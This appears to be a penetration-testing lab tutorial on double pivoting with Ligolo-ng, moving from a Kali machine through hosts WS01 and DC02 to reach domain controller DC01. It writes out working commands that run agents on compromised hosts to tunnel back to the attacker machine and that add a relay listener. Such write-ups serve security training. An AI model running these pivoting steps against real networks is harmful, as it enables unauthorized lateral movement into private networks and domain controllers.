## Lateral Movement — Double Pivoting with Ligolo-ng

![image](https://github.com/user-attachments/assets/d0ca8269-111b-4d38-8fca-6d994d1bb1c1)

### Summary
Hello everyone! In this article, I will discuss how to perform double pivoting using Ligolo-ng. I have previously covered this tool in another article, which you can check out [here]. If you’re unfamiliar with Ligolo-ng, I recommend reading my previous article for a better understanding. This discussion will focus solely on the practical implementation.

### infrastructure
The external network is on the 192.168.0.0/24 subnet, followed by the internal network on 10.10.10.0/24. Lastly, there is a private network where DC01 (Primary Domain Controller) resides. Our goal is to access this private network from our Kali Machine.

![image](https://github.com/user-attachments/assets/fd543f3a-c77e-4e32-8cfb-7c2f8bca73c8)

---
### First Pivoting
All we need here is access to WS01 to upload the ligolo-ng agent for use, you can follow these steps!

Running Proxy Server on Kali Machine

```bash
proxy -selfcert
```

by default the proxy server will run on port 11601, and on the victim side or WS01 we can run the following command.

```bash
.\agent.exe -connect <kali-ip>:11601 -ignore-cert
```

![image](https://github.com/user-attachments/assets/44438c70-e5bc-4554-bad8-5841987a05c8)

![image](https://github.com/user-attachments/assets/f54b20df-2f43-4105-9788-d9527bd8e0e0)

seen in this picture we have successfully pivoted to the internal network namely 10.10.10.0/24


---

### Second Pivot
To do double pivoting we need to set a listener on the WS01 machine through this ligolo-ng tool, so simply WS01 will open port 11601 and when someone connects to that port it will be redirected to Kali Machine, you can follow these steps.

![image](https://github.com/user-attachments/assets/ce16d446-bb1f-4348-b81f-09d4afd6ebf5)

Before that, first set the tun interface for the double Pivot


```bash
[Agent@WS01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

![image](https://github.com/user-attachments/assets/8d54264e-95e1-4f6d-b7bb-d70ee2378906)

to make sure you can use the “listener_list” command


Once the listener and interface are set up for double pivoting, we can proceed by uploading agent.exe to DC02, which has both internal and private network interfaces.

```bash
.\agent.exe -connect <WS01-ip>:11601 -ignore-cert
```

![image](https://github.com/user-attachments/assets/51a3adb7-4838-4a22-86f0-7f1e98764377)

And successfully connect


![image](https://github.com/user-attachments/assets/c75fa87a-7e54-4696-a703-ee8b399488d4)

and here the ligolo-ng session from agent DC02 successfully entered the server


![image](https://github.com/user-attachments/assets/af243136-7ea6-4e22-ae05-79062201dd3a)


![image](https://github.com/user-attachments/assets/4ca11e3a-b28d-470d-b092-57ca1ef7bdd4)

before starting to pivot we need to first configure the interface or add a route to the private ip

---
### Start Double Pivoting

```bash
[Agent@DC02]> tunnel_start --tun ligolo-double
```

![image](https://github.com/user-attachments/assets/14f2965b-d7ce-4892-9659-d88810e72166)

And we managed to access DC01 on the Private Network


![image](https://github.com/user-attachments/assets/2fbd0b49-e51f-4358-867e-169e76890ca3)

Access To WinRm

---
### Conclusions
We will configure a port redirector on WS01, which acts as an intermediary. When a connection request is made to the designated port on WS01, it will seamlessly forward the traffic to our local proxy server, effectively routing external access through our controlled pathway.

![image](https://github.com/user-attachments/assets/fdbf3119-f4db-4171-aa89-7dcad98a310e)


thank you for reading from beginning to end, if there are errors, please help correct them in the comments and see you.